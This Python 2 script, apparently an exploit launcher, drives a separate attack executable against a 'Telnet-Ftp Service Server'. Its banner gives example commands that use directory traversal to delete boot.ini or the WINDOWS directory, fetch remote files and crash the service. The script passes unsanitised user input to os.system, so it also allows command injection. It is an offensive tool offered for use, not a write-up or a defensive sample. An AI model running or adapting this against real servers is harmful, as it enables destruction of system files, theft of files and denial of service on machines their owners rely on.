#!/usr/bin/python
import sys
import socket
import os

print '\n#########  External Script Firerer : Invoker ########'
print '  '
print 'Examples of Valid commands :\n'
print 'Delete File: df ../../boot.ini'
print 'Create Directory: cd ../../poc'
print 'Delete Directory: dd ../../WINDOWS'
print 'Get File: gf ../../boot.ini'
print 'Crash Service: crash\n\n'
print '  '
print '  '
print '\n\nType quit to exit this interface\n'


if len(sys.argv) != 6:
    print "Usage: ./external-script-firerer.py <Target IP> <Port> <User> <Pass> <Exe_To_Be_Fired>"
    sys.exit(1)
  
target = sys.argv[1]
#port = int(sys.argv[2])
port = sys.argv[2]
user = sys.argv[3]
passw = sys.argv[4]
exe = sys.argv[5]
 
while port >= 1:
	cmd = raw_input("> ")
	if cmd == "quit":
	 sys.exit(0)
#	main_cmd = 'Telnet-Ftp_Service_Server_v1.x.exe' + ' ' + target + ' ' + port + ' ' + user + ' ' + passw + ' -' + cmd
#	main_cmd_bsd = './Telnet-Ftp_Service_Server_v1.x' + ' ' + target + ' ' + port + ' ' + user + ' ' + passw + ' -' + cmd
	main_cmd = exe + ' ' + target + ' ' + port + ' ' + user + ' ' + passw + ' -' + cmd

	print main_cmd
	os.system(main_cmd)
#	os.system(main_cmd_bsd)
